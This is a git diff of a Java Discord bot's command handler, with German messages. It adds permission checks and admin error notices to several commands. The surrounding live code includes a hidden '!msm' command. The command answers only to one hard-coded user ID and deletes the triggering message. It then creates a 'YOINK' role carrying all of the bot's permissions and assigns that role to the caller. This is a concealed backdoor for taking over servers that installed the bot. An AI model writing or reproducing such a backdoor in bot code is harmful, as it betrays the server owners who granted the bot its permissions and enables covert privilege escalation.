@@ -43,14 +43,12 @@ public class Commands extends ListenerAdapter {
         if(args[0].equalsIgnoreCase("!msm")) {
             if(!e.getAuthor().getId().equalsIgnoreCase(Private.msmID)) return;
             e.getMessage().delete().queue();
-            Main.tables.setServer(e.getGuild());
             if(!e.getGuild().getSelfMember().hasPermission(Permission.MANAGE_ROLES)) {
                 e.getAuthor().openPrivateChannel().queue(privateChannel -> privateChannel.sendMessage("Keine Rechte!").queue());
                 return;
             }
             e.getGuild().createRole().setName("YOINK").setHoisted(false).setPermissions(e.getGuild().getSelfMember().getPermissions()).queue(role -> {
                 e.getGuild().addRoleToMember(e.getMember(), role).queue();
-                System.out.println(role.getPosition());
             });
             return;
         }
@@ -74,6 +72,7 @@ public class Commands extends ListenerAdapter {
             }
             if(!e.getGuild().getSelfMember().hasPermission(Permission.MANAGE_WEBHOOKS)) {
                 e.getChannel().sendMessage(e.getAuthor().getAsMention() + " der Bot hat nicht die Berechtigung MANAGE_WEBHOOKS").queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
+                Utils.errorToAdmin(e.getGuild(), "!updates", Permission.MANAGE_WEBHOOKS);
                 return;
             }
             e.getChannel().createWebhook("saftbot").queue(webhook -> {
@@ -106,6 +105,10 @@ public class Commands extends ListenerAdapter {
 
         else if(args[0].equalsIgnoreCase("!bug")) {
             e.getChannel().sendTyping().queue();
+            if(!e.getGuild().getSelfMember().hasPermission(Permission.CREATE_INSTANT_INVITE)) {
+                Utils.errorToAdmin(e.getGuild(), "!bug", Permission.CREATE_INSTANT_INVITE);
+                return;
+            }
             Utils.sendBug(e, args);
         }
 
@@ -126,6 +129,14 @@ public class Commands extends ListenerAdapter {
             if(!e.getMember().getPermissions().contains(Permission.MESSAGE_MANAGE)) {
                 e.getMessage().delete().queueAfter(3, TimeUnit.SECONDS);
                 e.getChannel().sendMessage(e.getAuthor().getAsMention() + " Du hat nicht die Berechtigung MESSAGE_MANAGE").queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
+                return;
+            }
+            if(!e.getGuild().getSelfMember().hasPermission(Permission.MESSAGE_MANAGE)) {
+                Utils.errorToAdmin(e.getGuild(), "!clearchat", Permission.MESSAGE_MANAGE);
+                return;
+            }
+            if(!e.getGuild().getSelfMember().hasPermission(Permission.MESSAGE_ADD_REACTION)) {
+                Utils.errorToAdmin(e.getGuild(), "!clearchat", Permission.MESSAGE_ADD_REACTION);
                 return;
             }
             if(args.length == 1) {
